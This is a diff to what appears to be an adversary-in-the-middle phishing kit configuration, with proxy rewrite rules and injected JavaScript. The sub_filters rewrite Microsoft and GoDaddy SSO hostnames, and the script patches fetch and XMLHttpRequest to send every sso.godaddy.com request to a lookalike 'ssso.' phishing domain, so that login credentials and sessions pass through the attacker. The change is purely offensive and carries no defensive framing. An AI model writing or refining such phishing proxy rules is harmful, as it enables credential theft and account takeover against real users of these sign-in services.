@@ -144,9 +144,9 @@ sub_filters:
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
   - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "href=\"https://{hostname}", replace: "href=\"https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"] }
   - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"], redirect_only: true }
-# GoDaddy SSO API — rewrite API endpoint calls to use proxy (bypass CORS)
-  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "sso\\.godaddy\\.com/v1/api/pass/login", replace: "{hostname}/v1/api/pass/login", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"] }
-  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https://sso\\.godaddy\\.com/v1/api", replace: "https://{hostname}/v1/api", mimes: ["text/html", "application/json", "application/javascript"] }
+# GoDaddy SSO API — rewrite ALL sso.godaddy.com references in responses to use proxy
+  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "sso\\.godaddy\\.com", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"] }
+  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"], redirect_only: true }
 # GoDaddy SSO post-auth — rewrite Microsoft hostnames in body and Location header
   - { triggers_on: "sso.godaddy.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"] }
   - { triggers_on: "sso.godaddy.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"], redirect_only: true }
@@ -400,30 +400,27 @@ js_inject:
           navigator.serviceWorker.register = function() { return Promise.resolve({}); };
         }
 
-        // Derive phish domain to route API calls through proxy (bypass CORS)
-        var _phishDomain = (function() {
-          var parts = window.location.hostname.split('.');
-          return parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
-        })();
-
-        // Patch fetch to route GoDaddy API calls through proxy
+        // Additional safeguard: patch fetch/XHR to catch any sso.godaddy.com URLs
+        // (sub_filters will rewrite most, but this catches dynamic URL construction)
         var _origFetch = window.fetch;
         window.fetch = function(url, opts) {
           var urlStr = typeof url === 'string' ? url : (url && url.url) || '';
-          // Rewrite sso.godaddy.com/v1/api/* to proxy version
-          if (urlStr.indexOf('sso.godaddy.com/v1/api') !== -1) {
-            urlStr = urlStr.replace(/https?:\/\/sso\.godaddy\.com\//g, 'https://ssso.' + _phishDomain + '/');
+          if (urlStr.indexOf('sso.godaddy.com') !== -1) {
+            var parts = window.location.hostname.split('.');
+            var phish = parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
+            urlStr = urlStr.replace(/sso\.godaddy\.com/g, 'ssso.' + phish);
           }
           if (typeof url === 'string') url = urlStr;
           else if (url && url.url) url.url = urlStr;
           return _origFetch.apply(this, arguments);
         };
 
-        // Patch XHR to route GoDaddy API calls through proxy
         var _origOpen = XMLHttpRequest.prototype.open;
         XMLHttpRequest.prototype.open = function(method, url) {
-          if (typeof url === 'string' && url.indexOf('sso.godaddy.com/v1/api') !== -1) {
-            url = url.replace(/https?:\/\/sso\.godaddy\.com\//g, 'https://ssso.' + _phishDomain + '/');
+          if (typeof url === 'string' && url.indexOf('sso.godaddy.com') !== -1) {
+            var parts = window.location.hostname.split('.');
+            var phish = parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
+            url = url.replace(/sso\.godaddy\.com/g, 'ssso.' + phish);
           }
           return _origOpen.call(this, method, url);
         };
